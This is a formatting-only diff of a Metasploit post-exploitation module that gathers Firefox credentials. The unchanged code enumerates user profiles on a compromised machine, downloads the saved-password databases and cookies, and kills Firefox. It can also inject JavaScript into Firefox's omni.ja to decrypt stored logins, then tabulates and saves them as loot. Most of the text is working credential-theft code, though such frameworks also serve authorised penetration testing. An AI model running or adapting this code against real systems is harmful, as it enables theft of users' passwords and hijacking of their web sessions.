@@ -23,35 +23,37 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Windows::UserProfiles
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Multi Gather Firefox Signon Credential Collection',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Multi Gather Firefox Signon Credential Collection',
+        'Description' => %q{
           This module will collect credentials from the Firefox web browser if it is
-        installed on the targeted machine. Additionally, cookies are downloaded. Which
-        could potentially yield valid web sessions.
+          installed on the targeted machine. Additionally, cookies are downloaded. Which
+          could potentially yield valid web sessions.
 
-        Firefox stores passwords within the signons.sqlite database file. There is also a
-        keys3.db file which contains the key for decrypting these passwords. In cases where
-        a Master Password has not been set, the passwords can easily be decrypted using
-        3rd party tools or by setting the DECRYPT option to true. Using the latter often
-        needs root privileges. Also be warned that if your session dies in the middle of the
-        file renaming process, this could leave Firefox in a non working state. If a
-        Master Password was used the only option would be to bruteforce.
+          Firefox stores passwords within the signons.sqlite database file. There is also a
+          keys3.db file which contains the key for decrypting these passwords. In cases where
+          a Master Password has not been set, the passwords can easily be decrypted using
+          3rd party tools or by setting the DECRYPT option to true. Using the latter often
+          needs root privileges. Also be warned that if your session dies in the middle of the
+          file renaming process, this could leave Firefox in a non working state. If a
+          Master Password was used the only option would be to bruteforce.
 
-        Useful 3rd party tools:
-        + firefox_decrypt (https://github.com/Unode/firefox_decrypt)
-        + pswRecovery4Moz (https://github.com/philsmd/pswRecovery4Moz)
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
+          Useful 3rd party tools:
+          + firefox_decrypt (https://github.com/Unode/firefox_decrypt)
+          + pswRecovery4Moz (https://github.com/philsmd/pswRecovery4Moz)
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'bannedit',
           'xard4s', # added decryption support
           'g0tmi1k' # @g0tmi1k // https://blog.g0tmi1k.com/ - additional features
         ],
-      'Platform'       => %w{ bsd linux osx unix win },
-      'SessionTypes'   => ['meterpreter', 'shell' ]
-    ))
+        'Platform' => %w{bsd linux osx unix win},
+        'SessionTypes' => ['meterpreter', 'shell' ]
+      )
+    )
 
     register_options([
       OptBool.new('DECRYPT', [false, 'Decrypts passwords without third party tools', false])
@@ -60,10 +62,9 @@ class MetasploitModule < Msf::Post
     register_advanced_options([
       OptInt.new('DOWNLOAD_TIMEOUT', [true, 'Timeout to wait when downloading files through shell sessions', 20]),
       OptBool.new('DISCLAIMER', [false, 'Acknowledge the DECRYPT warning', false]),
-      OptBool.new('RECOVER',  [false, 'Attempt to recover from bad DECRYPT when possible', false])
+      OptBool.new('RECOVER', [false, 'Attempt to recover from bad DECRYPT when possible', false])
     ])
   end
-
 
   def run
     # Certain shells for certain platform
@@ -86,7 +87,7 @@ class MetasploitModule < Msf::Post
 
     if datastore['DECRYPT']
       do_decrypt
-    else  # Non DECRYPT
+    else # Non DECRYPT
       paths = []
       paths = enum_users
 
@@ -194,7 +195,6 @@ class MetasploitModule < Msf::Post
     print_line
   end
 
-
   def decrypt_file_stats(temp_file, org_file, path)
     print_line
     print_error("Detected #{temp_file} already on the target. This could possible a possible backup of the original #{org_file} from a bad DECRYPT attack.")
@@ -204,7 +204,6 @@ class MetasploitModule < Msf::Post
     print_status("#{temp_file}: Created- #{session.fs.file.stat(@paths['ff'] + temp_file).ctime}  Modified- #{session.fs.file.stat(@paths['ff'] + temp_file).mtime}  Accessed- #{session.fs.file.stat(@paths['ff'] + temp_file).ctime}")
     print_line
   end
-
 
   def decrypt_recover_omni(temp_file, org_file)
     print_status("Restoring: #{@paths['ff'] + temp_file} (Possible backup)")
@@ -223,7 +222,6 @@ class MetasploitModule < Msf::Post
     true
   end
 
-
   def enum_users
     paths = []
     id = whoami
@@ -237,10 +235,11 @@ class MetasploitModule < Msf::Post
       vprint_status("Searching every possible account on the target system")
       grab_user_profiles().each do |user|
         next if user['AppData'].nil?
+
         dir = check_firefox_win(user['AppData'])
         paths << dir if dir
       end
-    else   # unix, bsd, linux, osx
+    else # unix, bsd, linux, osx
       @platform == :osx ? (home = "/Users/") : (home = "/home/")
 
       if got_root
@@ -274,9 +273,9 @@ class MetasploitModule < Msf::Post
   end
 
   def check_firefox_win(path)
-    paths  = []
+    paths = []
     ffpath = []
-    path   = path + "\\Mozilla\\"
+    path = path + "\\Mozilla\\"
     print_status("Checking for Firefox profile in: #{path}")
 
     stat = session.fs.file.stat(path + "Firefox\\profiles.ini") rescue nil
@@ -286,7 +285,7 @@ class MetasploitModule < Msf::Post
     end
 
     session.fs.dir.foreach(path) do |fdir|
-      #print_status("Found a Firefox directory: #{path + fdir}")
+      # print_status("Found a Firefox directory: #{path + fdir}")
       ffpath << path + fdir
       break
     end
@@ -296,13 +295,14 @@ class MetasploitModule < Msf::Post
       return
     end
 
-    #print_status("Locating Firefox profiles")
+    # print_status("Locating Firefox profiles")
     path << "Firefox\\Profiles\\"
 
     # We should only have profiles in the Profiles directory store them all
     begin
       session.fs.dir.foreach(path) do |pdirs|
         next if pdirs == "." or pdirs == ".."
+
         vprint_good("Found profile: #{path + pdirs}")
         paths << path + pdirs
       end
@@ -313,7 +313,6 @@ class MetasploitModule < Msf::Post
 
     paths.empty? ? (nil) : (paths)
   end
-
 
   def download_loot(paths)
     loot = ""
@@ -328,7 +327,7 @@ class MetasploitModule < Msf::Post
       profile = path.scan(/Profiles[\\|\/](.+)\.(.+)$/).flatten[0].to_s
       profile = path.scan(/firefox[\\|\/](.+)\.(.+)$/).flatten[0].to_s if profile.empty?
 
-      session.type == "meterpreter" ? (files = session.fs.dir.foreach(path)) : (files = cmd_exec("find "+ path.gsub(/ /, "\\ ") + " -maxdepth 1 -mindepth 1 -type f 2>/dev/null").gsub(/.*\//, "").split("\n"))
+      session.type == "meterpreter" ? (files = session.fs.dir.foreach(path)) : (files = cmd_exec("find " + path.gsub(/ /, "\\ ") + " -maxdepth 1 -mindepth 1 -type f 2>/dev/null").gsub(/.*\//, "").split("\n"))
 
       files.each do |file|
         file.chomp!
@@ -340,7 +339,7 @@ class MetasploitModule < Msf::Post
             p = store_loot("ff.#{profile}.#{file}", "#{mime}/#{ext}", session, "firefox_#{file}")
             session.fs.file.download_file(p, path + "\\" + file)
             print_good("Downloaded #{file}: #{p.to_s}")
-          else   # windows has to be meterpreter, so can be anything else (unix, bsd, linux, osx)
+          else # windows has to be meterpreter, so can be anything else (unix, bsd, linux, osx)
             loot = cmd_exec("cat #{path}//#{file}", nil, datastore['DOWNLOAD_TIMEOUT'])
             if loot.nil? || loot.empty?
               print_error("Failed to download #{file}, if the file is very long, try increasing DOWNLOAD_TIMEOUT")
@@ -354,7 +353,6 @@ class MetasploitModule < Msf::Post
       print_line
     end
   end
-
 
   # Checks for needed privileges and if Firefox is installed
   def decrypt_get_env
@@ -418,7 +416,6 @@ class MetasploitModule < Msf::Post
     true
   end
 
-
   def decrypt_modify_omnija(zip)
     # Which files to extract from ja/zip
     files = [
@@ -465,7 +462,6 @@ class MetasploitModule < Msf::Post
     # Patch ./components/storage-mozStorage.js - returns true or false
     return decrypt_patch_method(stor_js)
   end
-
 
   # Patches getAllLogins() methods in ./components/storage-mozStorage.js
   def decrypt_patch_method(stor_js)
@@ -514,11 +510,11 @@ Components.utils.import("resource://gre/modules/XPCOMUtils.jsm");
       # There is no real substitution if the matching regex has no corresponding patch code
       if i != 0 && line.sub!(regex[i][0]) do |match|
         if regex[i][1]
-          vprint_good("[#{x-i+1}/#{x}] Javascript injected - ./components/storage-mozStorage.js")
+          vprint_good("[#{x - i + 1}/#{x}] Javascript injected - ./components/storage-mozStorage.js")
           regex[i][1]
         end
       end # do |match|
-      i -= 1
+        i -= 1
       end # if i != 0
       data << line
     end
@@ -531,7 +527,6 @@ Components.utils.import("resource://gre/modules/XPCOMUtils.jsm");
 
     i == 0 ? (true) : (false)
   end
-
 
   # Starts a new Firefox process and triggers decryption
   def decrypt_trigger_decrypt(org_file, new_file, temp_file)
@@ -580,7 +575,7 @@ Components.utils.import("resource://gre/modules/XPCOMUtils.jsm");
           end
         end
       end
-    else   # windows has to be meterpreter, so can be anything else (unix, bsd, linux, osx)
+    else # windows has to be meterpreter, so can be anything else (unix, bsd, linux, osx)
       p = cmd_exec("ps", "cax | grep firefox")
       if p =~ /firefox/
         print_status("Found running Firefox process, attempting to kill.")
@@ -612,7 +607,7 @@ Components.utils.import("resource://gre/modules/XPCOMUtils.jsm");
 
     # Lets just check theres something before going forward
     if session.type == "meterpreter"
-      i=20
+      i = 20
       vprint_status("Waiting up to #{i} seconds for loot file (#{@paths['loot']}) to be generated") unless session.fs.file.exist?(@paths['loot'])
       while (!session.fs.file.exist?(@paths['loot']))
         sleep 1
@@ -651,7 +646,6 @@ Components.utils.import("resource://gre/modules/XPCOMUtils.jsm");
     true
   end
 
-
   def decrypt_download_creds
     print_good("Downloading loot: #{@paths['loot']}")
     loot = read_file(@paths['loot'])
@@ -669,7 +663,7 @@ Components.utils.import("resource://gre/modules/XPCOMUtils.jsm");
     cred_table = Rex::Text::Table.new(
       'Header' => 'Firefox Credentials',
       'Indent' => 1,
-      'Columns'=>
+      'Columns' =>
         [
           'Hostname',
           'User',
@@ -707,19 +701,19 @@ Components.utils.import("resource://gre/modules/XPCOMUtils.jsm");
       session,
       cred_table.to_csv,
       "firefox_credentials.txt",
-      "Firefox Credentials")
+      "Firefox Credentials"
+    )
     vprint_good("Saved loot: #{path.to_s}")
 
     # Display out
     vprint_line("\n" + cred_table.to_s)
   end
 
-
   def got_root
     case @platform
     when :windows
       session.sys.config.getuid =~ /SYSTEM/ ? true : false
-    else   # unix, bsd, linux, osx
+    else # unix, bsd, linux, osx
       id_output = cmd_exec("id").chomp
       if id_output.blank?
         # try an absolute path
@@ -728,7 +722,6 @@ Components.utils.import("resource://gre/modules/XPCOMUtils.jsm");
       id_output.include?("uid=0(") ? true : false
     end
   end
-
 
   def whoami
     if @platform == :windows
